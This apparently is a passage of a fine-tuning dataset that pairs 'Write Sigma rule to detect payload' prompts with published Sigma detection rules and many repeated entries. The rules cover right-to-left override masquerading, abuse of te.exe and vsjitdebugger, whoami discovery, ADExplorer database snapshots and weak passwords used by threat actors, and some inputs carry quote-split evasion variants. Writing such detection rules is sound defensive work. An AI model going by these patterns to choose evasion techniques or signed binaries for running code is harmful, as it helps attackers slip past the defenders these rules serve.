selection*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "‮", "output": "title: Potential Defense Evasion Via Right-to-Left Override\nid: ad691d92-15f2-4181-9aa4-723c74f9ddc3\nrelated:\n    - id: e0552b19-5a83-4222-b141-b36184bb8d79\n      type: derived\n    - id: 584bca0f-3608-4402-80fd-4075ff6072e3\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\n    This is used as an obfuscation and masquerading techniques.\nreferences:\n    - https://redcanary.com/blog/right-to-left-override/\n    - https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method\n    - https://unicode-explorer.com/c/202E\nauthor: Micah Babinski, @micahbabinski\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1036.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: \"\\u202e\"\n    condition: selection\nfalsepositives:\n    - Commandlines that contains scriptures such as arabic or hebrew might make use of this character\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "‮", "output": "title: Potential Defense Evasion Via Right-to-Left Override\nid: ad691d92-15f2-4181-9aa4-723c74f9ddc3\nrelated:\n    - id: e0552b19-5a83-4222-b141-b36184bb8d79\n      type: derived\n    - id: 584bca0f-3608-4402-80fd-4075ff6072e3\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\n    This is used as an obfuscation and masquerading techniques.\nreferences:\n    - https://redcanary.com/blog/right-to-left-override/\n    - https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method\n    - https://unicode-explorer.com/c/202E\nauthor: Micah Babinski, @micahbabinski\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1036.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: \"\\u202e\"\n    condition: selection\nfalsepositives:\n    - Commandlines that contains scriptures such as arabic or hebrew might make use of this character\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "‮", "output": "title: Potential Defense Evasion Via Right-to-Left Override\nid: ad691d92-15f2-4181-9aa4-723c74f9ddc3\nrelated:\n    - id: e0552b19-5a83-4222-b141-b36184bb8d79\n      type: derived\n    - id: 584bca0f-3608-4402-80fd-4075ff6072e3\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the \"u202+E\" character, which causes a terminal, browser, or operating system to render text in a right-to-left sequence.\n    This is used as an obfuscation and masquerading techniques.\nreferences:\n    - https://redcanary.com/blog/right-to-left-override/\n    - https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method\n    - https://unicode-explorer.com/c/202E\nauthor: Micah Babinski, @micahbabinski\ndate: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1036.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: \"\\u202e\"\n    condition: selection\nfalsepositives:\n    - Commandlines that contains scriptures such as arabic or hebrew might make use of this character\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\userinit.exe \\netlogon\\ \\explorer.exe explorer.exe", "output": "title: Suspicious Userinit Child Process\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nstatus: test\ndescription: Detects a suspicious child process of userinit\nreferences:\n    - https://twitter.com/SBousseaden/status/1139811587760562176\nauthor: Florian Roth (Nextron Systems), Samir Bousseaden (idea)\ndate: 2019-06-17\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\userinit.exe \\\"\\netlogon\\\\\" \\explorer.exe explorer.exe", "output": "title: Suspicious Userinit Child Process\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nstatus: test\ndescription: Detects a suspicious child process of userinit\nreferences:\n    - https://twitter.com/SBousseaden/status/1139811587760562176\nauthor: Florian Roth (Nextron Systems), Samir Bousseaden (idea)\ndate: 2019-06-17\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\userinit \\netlogon\\ \\explorer explorer", "output": "title: Suspicious Userinit Child Process\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nstatus: test\ndescription: Detects a suspicious child process of userinit\nreferences:\n    - https://twitter.com/SBousseaden/status/1139811587760562176\nauthor: Florian Roth (Nextron Systems), Samir Bousseaden (idea)\ndate: 2019-06-17\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\userinit.exe \\explorer.exe \\netlogon\\ explorer.exe", "output": "title: Suspicious Userinit Child Process\nid: b655a06a-31c0-477a-95c2-3726b83d649d\nstatus: test\ndescription: Detects a suspicious child process of userinit\nreferences:\n    - https://twitter.com/SBousseaden/status/1139811587760562176\nauthor: Florian Roth (Nextron Systems), Samir Bousseaden (idea)\ndate: 2019-06-17\nmodified: 2022-12-09\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\te.exe \\te.exe \\te.exe", "output": "title: Malicious Windows Script Components File Execution by TAEF Detection\nid: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b\nstatus: test\ndescription: |\n  Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\n  Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/\n    - https://twitter.com/pabraeken/status/993298228840992768\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-13\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\te.exe'\n        - ParentImage|endswith: '\\te.exe'\n        - OriginalFileName: '\\te.exe'\n    condition: selection\nfalsepositives:\n    - It's not an uncommon to use te.exe directly to execute legal TAEF tests\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\te.exe \\te.exe \\te\".exe\"", "output": "title: Malicious Windows Script Components File Execution by TAEF Detection\nid: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b\nstatus: test\ndescription: |\n  Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\n  Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/\n    - https://twitter.com/pabraeken/status/993298228840992768\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-13\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\te.exe'\n        - ParentImage|endswith: '\\te.exe'\n        - OriginalFileName: '\\te.exe'\n    condition: selection\nfalsepositives:\n    - It's not an uncommon to use te.exe directly to execute legal TAEF tests\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\te \\te \\te", "output": "title: Malicious Windows Script Components File Execution by TAEF Detection\nid: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b\nstatus: test\ndescription: |\n  Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\n  Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/\n    - https://twitter.com/pabraeken/status/993298228840992768\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-13\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\te.exe'\n        - ParentImage|endswith: '\\te.exe'\n        - OriginalFileName: '\\te.exe'\n    condition: selection\nfalsepositives:\n    - It's not an uncommon to use te.exe directly to execute legal TAEF tests\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\te.exe \\te.exe \\te.exe", "output": "title: Malicious Windows Script Components File Execution by TAEF Detection\nid: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b\nstatus: test\ndescription: |\n  Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces\n  Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/\n    - https://twitter.com/pabraeken/status/993298228840992768\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/taef/\nauthor: 'Agro (@agro_sev) oscd.community'\ndate: 2020-10-13\nmodified: 2021-11-27\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\te.exe'\n        - ParentImage|endswith: '\\te.exe'\n        - OriginalFileName: '\\te.exe'\n    condition: selection\nfalsepositives:\n    - It's not an uncommon to use te.exe directly to execute legal TAEF tests\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsjitdebugger.exe \\vsimmersiveactivatehelper .exe \\devenv.exe", "output": "title: Malicious PE Execution by Microsoft Visual Studio Debugger\nid: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2\nstatus: test\ndescription: |\n  There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\n  This option may be used adversaries to execute malicious code by signed verified binary.\n  The debugger is installed alongside with Microsoft Visual Studio package.\nreferences:\n    - https://twitter.com/pabraeken/status/990758590020452353\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/\n    - https://learn.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019\nauthor: Agro (@agro_sev), Ensar Şamil (@sblmsrsn), oscd.community\ndate: 2020-10-14\nmodified: 2022-10-09\ntags:\n    - attack.t1218\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vsjitdebugger.exe'\n    reduction1:\n        Image|endswith: '\\vsimmersiveactivatehelper*.exe'\n    reduction2:\n        Image|endswith: '\\devenv.exe'\n    condition: selection and not (reduction1 or reduction2)\nfalsepositives:\n    - The process spawned by vsjitdebugger.exe is uncommon.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsjitdebugger.exe \\vsimmersiveactivatehelper \".exe\" \"\\devenv.exe\"", "output": "title: Malicious PE Execution by Microsoft Visual Studio Debugger\nid: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2\nstatus: test\ndescription: |\n  There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\n  This option may be used adversaries to execute malicious code by signed verified binary.\n  The debugger is installed alongside with Microsoft Visual Studio package.\nreferences:\n    - https://twitter.com/pabraeken/status/990758590020452353\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/\n    - https://learn.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019\nauthor: Agro (@agro_sev), Ensar Şamil (@sblmsrsn), oscd.community\ndate: 2020-10-14\nmodified: 2022-10-09\ntags:\n    - attack.t1218\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vsjitdebugger.exe'\n    reduction1:\n        Image|endswith: '\\vsimmersiveactivatehelper*.exe'\n    reduction2:\n        Image|endswith: '\\devenv.exe'\n    condition: selection and not (reduction1 or reduction2)\nfalsepositives:\n    - The process spawned by vsjitdebugger.exe is uncommon.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsjitdebugger \\vsimmersiveactivatehelper \\devenv", "output": "title: Malicious PE Execution by Microsoft Visual Studio Debugger\nid: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2\nstatus: test\ndescription: |\n  There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\n  This option may be used adversaries to execute malicious code by signed verified binary.\n  The debugger is installed alongside with Microsoft Visual Studio package.\nreferences:\n    - https://twitter.com/pabraeken/status/990758590020452353\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/\n    - https://learn.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019\nauthor: Agro (@agro_sev), Ensar Şamil (@sblmsrsn), oscd.community\ndate: 2020-10-14\nmodified: 2022-10-09\ntags:\n    - attack.t1218\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vsjitdebugger.exe'\n    reduction1:\n        Image|endswith: '\\vsimmersiveactivatehelper*.exe'\n    reduction2:\n        Image|endswith: '\\devenv.exe'\n    condition: selection and not (reduction1 or reduction2)\nfalsepositives:\n    - The process spawned by vsjitdebugger.exe is uncommon.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\vsjitdebugger.exe \\devenv.exe .exe \\vsimmersiveactivatehelper", "output": "title: Malicious PE Execution by Microsoft Visual Studio Debugger\nid: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2\nstatus: test\ndescription: |\n  There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\n  This option may be used adversaries to execute malicious code by signed verified binary.\n  The debugger is installed alongside with Microsoft Visual Studio package.\nreferences:\n    - https://twitter.com/pabraeken/status/990758590020452353\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/\n    - https://learn.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019\nauthor: Agro (@agro_sev), Ensar Şamil (@sblmsrsn), oscd.community\ndate: 2020-10-14\nmodified: 2022-10-09\ntags:\n    - attack.t1218\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\vsjitdebugger.exe'\n    reduction1:\n        Image|endswith: '\\vsimmersiveactivatehelper*.exe'\n    reduction2:\n        Image|endswith: '\\devenv.exe'\n    condition: selection and not (reduction1 or reduction2)\nfalsepositives:\n    - The process spawned by vsjitdebugger.exe is uncommon.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "123456789 123123qwE Asd123.aaaa Decryptme P@ssw0rd! Pass8080 password123 test@202", "output": "title: Weak or Abused Passwords In CLI\nid: 91edcfb1-2529-4ac2-9ecc-7617f895c7e4\nstatus: test\ndescription: |\n    Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\n    An example would be a threat actor creating a new user via the net command and providing the password inline\nreferences:\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\n    - https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # Add more passwords\n            - '123456789'\n            - '123123qwE'\n            - 'Asd123.aaaa'\n            - 'Decryptme'\n            - 'P@ssw0rd!'\n            - 'Pass8080'\n            - 'password123' # Also covers PASSWORD123123! as seen in https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n            - 'test@202' # Covers multiple years\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the passwords by users via commandline (should be discouraged)\n    - Other currently unknown false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "123456789 123123qwE Asd123.aaaa Decryptme P@ssw0rd! \\\"P\\\"\\\"a\\\"\\\"s\\\"\\\"s\\\"\\\"8\\\"\\\"0\\\"\\\"8\\\"\\\"0\\\" password123 test@202", "output": "title: Weak or Abused Passwords In CLI\nid: 91edcfb1-2529-4ac2-9ecc-7617f895c7e4\nstatus: test\ndescription: |\n    Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\n    An example would be a threat actor creating a new user via the net command and providing the password inline\nreferences:\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\n    - https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # Add more passwords\n            - '123456789'\n            - '123123qwE'\n            - 'Asd123.aaaa'\n            - 'Decryptme'\n            - 'P@ssw0rd!'\n            - 'Pass8080'\n            - 'password123' # Also covers PASSWORD123123! as seen in https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n            - 'test@202' # Covers multiple years\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the passwords by users via commandline (should be discouraged)\n    - Other currently unknown false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "123456789 123123qwE Asd123.aaaa Decryptme P@ssw0rd! Pass8080 password123 test@202", "output": "title: Weak or Abused Passwords In CLI\nid: 91edcfb1-2529-4ac2-9ecc-7617f895c7e4\nstatus: test\ndescription: |\n    Detects weak passwords or often abused passwords (seen used by threat actors) via the CLI.\n    An example would be a threat actor creating a new user via the net command and providing the password inline\nreferences:\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-asia-governments\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\n    - https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n    - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-14\nmodified: 2024-02-23\ntags:\n    - attack.defense-evasion\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # Add more passwords\n            - '123456789'\n            - '123123qwE'\n            - 'Asd123.aaaa'\n            - 'Decryptme'\n            - 'P@ssw0rd!'\n            - 'Pass8080'\n            - 'password123' # Also covers PASSWORD123123! as seen in https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/\n            - 'test@202' # Covers multiple years\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the passwords by users via commandline (should be discouraged)\n    - Other currently unknown false positives\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe whoami", "output": "title: WhoAmI as Parameter\nid: e9142d84-fbe0-401d-ac50-3e519fb00c89\nstatus: test\ndescription: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nreferences:\n    - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-11-29\nmodified: 2022-12-25\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.exe whoami'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe \"who\"ami", "output": "title: WhoAmI as Parameter\nid: e9142d84-fbe0-401d-ac50-3e519fb00c89\nstatus: test\ndescription: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nreferences:\n    - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-11-29\nmodified: 2022-12-25\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.exe whoami'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami", "output": "title: WhoAmI as Parameter\nid: e9142d84-fbe0-401d-ac50-3e519fb00c89\nstatus: test\ndescription: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nreferences:\n    - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-11-29\nmodified: 2022-12-25\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.exe whoami'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": ".exe whoami", "output": "title: WhoAmI as Parameter\nid: e9142d84-fbe0-401d-ac50-3e519fb00c89\nstatus: test\ndescription: Detects a suspicious process command line that uses whoami as first parameter (as e.g. used by EfsPotato)\nreferences:\n    - https://twitter.com/blackarrowsec/status/1463805700602224645?s=12\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-11-29\nmodified: 2022-12-25\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: '.exe whoami'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\Mrt.exe \\MsMpEng.exe \\ngen.exe \\rpcnet.exe \\services.exe \\TiWorker.exe", "output": "title: Uncommon Svchost Parent Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: test\ndescription: Detects an uncommon svchost parent process\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-08-15\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_generic:\n        ParentImage|endswith:\n            - '\\Mrt.exe'\n            - '\\MsMpEng.exe'\n            - '\\ngen.exe'\n            - '\\rpcnet.exe'\n            - '\\services.exe'\n            - '\\TiWorker.exe'\n    filter_main_parent_null:\n        ParentImage: null\n    filter_main_parent_empty:\n        ParentImage:\n            - '-'\n            - ''\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\Mrt.exe \\MsMpEng.exe \"\\ngen.exe\" \\rpcnet.exe \\services.exe \\TiWorker.exe", "output": "title: Uncommon Svchost Parent Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: test\ndescription: Detects an uncommon svchost parent process\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-08-15\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_generic:\n        ParentImage|endswith:\n            - '\\Mrt.exe'\n            - '\\MsMpEng.exe'\n            - '\\ngen.exe'\n            - '\\rpcnet.exe'\n            - '\\services.exe'\n            - '\\TiWorker.exe'\n    filter_main_parent_null:\n        ParentImage: null\n    filter_main_parent_empty:\n        ParentImage:\n            - '-'\n            - ''\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost \\Mrt \\MsMpEng \\ngen \\rpcnet \\services \\TiWorker", "output": "title: Uncommon Svchost Parent Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: test\ndescription: Detects an uncommon svchost parent process\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-08-15\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_generic:\n        ParentImage|endswith:\n            - '\\Mrt.exe'\n            - '\\MsMpEng.exe'\n            - '\\ngen.exe'\n            - '\\rpcnet.exe'\n            - '\\services.exe'\n            - '\\TiWorker.exe'\n    filter_main_parent_null:\n        ParentImage: null\n    filter_main_parent_empty:\n        ParentImage:\n            - '-'\n            - ''\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\svchost.exe \\Mrt.exe \\MsMpEng.exe \\ngen.exe \\rpcnet.exe \\services.exe \\TiWorker.exe", "output": "title: Uncommon Svchost Parent Process\nid: 01d2e2a1-5f09-44f7-9fc1-24faa7479b6d\nstatus: test\ndescription: Detects an uncommon svchost parent process\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2017-08-15\nmodified: 2022-06-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\svchost.exe'\n    filter_main_generic:\n        ParentImage|endswith:\n            - '\\Mrt.exe'\n            - '\\MsMpEng.exe'\n            - '\\ngen.exe'\n            - '\\rpcnet.exe'\n            - '\\services.exe'\n            - '\\TiWorker.exe'\n    filter_main_parent_null:\n        ParentImage: null\n    filter_main_parent_empty:\n        ParentImage:\n            - '-'\n            - ''\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ADExplorer.exe AdExp snapshot", "output": "title: Active Directory Database Snapshot Via ADExplorer\nid: 9212f354-7775-4e28-9c9f-8f0a4544e664\nrelated:\n    - id: ef61af62-bc74-4f58-b49b-626448227652\n      type: derived\nstatus: test\ndescription: Detects the execution of Sysinternals ADExplorer with the \"-snapshot\" flag in order to save a local copy of the active directory database.\nreferences:\n    - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-14\ntags:\n    - attack.credential-access\n    - attack.t1552.001\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ADExplorer.exe'\n        - OriginalFileName: 'AdExp'\n    selection_cli:\n        CommandLine|contains: 'snapshot'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
